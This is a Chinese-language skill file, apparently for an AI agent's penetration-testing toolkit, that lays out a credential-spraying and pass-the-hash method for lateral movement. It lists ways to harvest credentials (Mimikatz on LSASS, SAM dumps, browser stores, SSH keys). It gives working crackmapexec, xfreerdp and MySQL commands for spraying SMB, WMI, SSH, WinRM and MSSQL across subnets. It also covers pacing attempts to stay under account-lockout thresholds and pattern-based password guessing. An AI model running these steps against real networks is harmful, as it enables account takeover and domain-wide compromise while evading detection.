---
name: cred-spray
description: "凭据喷洒与复用攻击。当已收集到用户名/密码/哈希后，需要验证凭据在其他服务/主机上是否有效时使用。覆盖密码喷洒策略（避免锁定）、凭据复用检测、PTH/PTK 攻击。用于扩大控制范围"
metadata:
  tags: "credential,spray,brute,凭据喷洒,password spray,密码复用,pth,pass the hash,ntlm"
  category: "lateral"
---

# 凭据喷洒攻击方法论

凭据喷洒和暴力破解不同——暴力破解是对一个账户试很多密码，凭据喷洒是**用一个密码试很多账户**。后者不容易触发账户锁定。

## Phase 1: 凭据清点

### 1.1 汇总已有凭据
用 `evidence_list` + `evidence_read`（筛选凭据类型）获取已收集的所有凭据。

凭据来源总结：
| 来源 | 凭据类型 | 获取方法 |
|------|----------|----------|
| 配置文件 | 明文密码 | 数据库连接串、.env 文件 |
| LSASS 内存 | NTLM 哈希/明文 | Mimikatz |
| SAM 数据库 | NTLM 哈希 | reg save + secretsdump |
| 浏览器 | 明文密码 | Chrome Login Data |
| SSH 密钥 | 私钥 | ~/.ssh/id_rsa |
| 历史命令 | 明文密码 | .bash_history |
| Kerberos | TGS 票据 | Kerberoasting |

### 1.2 构造凭据字典
将收集到的凭据整理为：
- 用户名列表
- 密码列表（明文 + 常见变体如 Password1! → Password2!）
- 哈希列表（用于 PTH）

## Phase 2: 喷洒策略

### 2.1 密码喷洒（避免锁定）
**关键原则**：一次只试一个密码，等待间隔后再试下一个。

```bash
# 使用 crackmapexec 对 SMB 喷洒
cme smb 10.0.0.0/24 -u userlist.txt -p 'Password123!' --continue-on-success

# 单密码多用户（安全）
cme smb DC_IP -u userlist.txt -p 'Summer2024!' --continue-on-success

# 多密码时设置间隔（通常锁定策略是 30 分钟 5 次）
# 每次只试一个密码，间隔 35 分钟
```

### 2.2 Pass-the-Hash (PTH)
有 NTLM 哈希不需要明文密码：
```bash
# SMB
cme smb 10.0.0.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:HASH'

# WMI
cme wmi TARGET -u administrator -H HASH

# RDP (Restricted Admin 模式)
xfreerdp /v:TARGET /u:administrator /pth:HASH
```

### 2.3 多服务喷洒
同一凭据尝试不同服务：
```bash
# SSH
cme ssh 10.0.0.0/24 -u admin -p 'password'

# WinRM
cme winrm 10.0.0.0/24 -u admin -p 'password'

# MSSQL
cme mssql 10.0.0.0/24 -u sa -p 'password'

# MySQL
# MySQL（使用 nuclei 自定义模板爆破）
echo 'root' | nuclei -u mysql://10.0.0.1:3306 -t ~/nuclei-templates/brute/ 2>/dev/null || \
  mysql -h 10.0.0.1 -u root -p'password' -e "SELECT 1"
```

## Phase 3: 结果分析

成功的凭据用 `evidence_save` 保存，然后评估：
- **本地管理员** → 可用于横向移动到该主机
- **域用户** → 可用于域内资源访问
- **域管理员** → 游戏结束，直接控制整个域
- **服务账户** → 可能有特殊权限（数据库/备份等）

## Phase 4: 密码规律分析

从已获取的密码中寻找模式：
- 公司名+年份：`Company2024!`
- 季节+年份：`Summer2024!`, `Winter2024`
- 键盘模式：`Qwer1234!`, `P@ssw0rd`
- 用户名变体：`john` → `John123!`

用发现的模式生成更多候选密码进行喷洒。

## 注意事项
- 了解目标的账户锁定策略（`net accounts /domain`）
- 通常策略：5 次错误锁定 30 分钟 → 每 35 分钟最多试 4 次
- 优先喷洒高价值目标（域控/数据库/备份服务器）
- PTH 不触发账户锁定（不经过密码验证）

## 锁定策略感知
- 控制尝试次数在 4 次以内（低于 5 次阈值），不触发账户锁定
